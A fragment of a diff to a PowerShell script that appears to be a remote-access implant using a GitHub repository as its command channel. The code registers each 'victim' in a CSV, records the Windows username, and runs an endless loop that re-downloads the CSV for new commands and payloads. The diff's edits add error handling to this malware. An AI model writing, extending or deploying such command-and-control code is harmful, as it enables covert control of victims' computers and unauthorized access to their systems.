@@ -63,13 +63,17 @@ $wc.Headers.Add("Accept", "application/vnd.github.v3+json")
 # === ADD MessageBox ===
 Add-Type -AssemblyName PresentationFramework
 
-# === REGISTER VICTIM IN CSV ===
+# === FETCH CSV METADATA AND DOWNLOAD URL ONCE ===
 try {
     $MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
     $metaJson = $wc.DownloadString($MetaURL)
     $metaObj = ConvertFrom-Json $metaJson
     $downloadUrl = $metaObj.download_url
     $sha = $metaObj.sha
+
+    if (-not $downloadUrl) {
+        throw "Failed to obtain download URL."
+    }
 
     $csvText = $wc.DownloadString($downloadUrl)
     $lines = $csvText -split "`r?`n"
@@ -105,7 +109,7 @@ try {
         $user = $env:USERNAME
         $pass = "NOT_CAPTURED"
 
-        # === CREATE NEW CSV ROW SAFELY ===
+        # === CREATE NEW CSV ROW ===
         $lastId = 0
         foreach ($line in $lines) {
             if ($line -match "^\d+,") {
@@ -160,6 +164,7 @@ Start-Sleep -Seconds $FirstWaitSeconds
 # === POLLING LOOP ===
 while ($true) {
     try {
+        # Always refresh the CSV to get updated commands
         $csvText = $wc.DownloadString($downloadUrl)
         $lines = $csvText -split "`r?`n"
         $foundPayload = $false
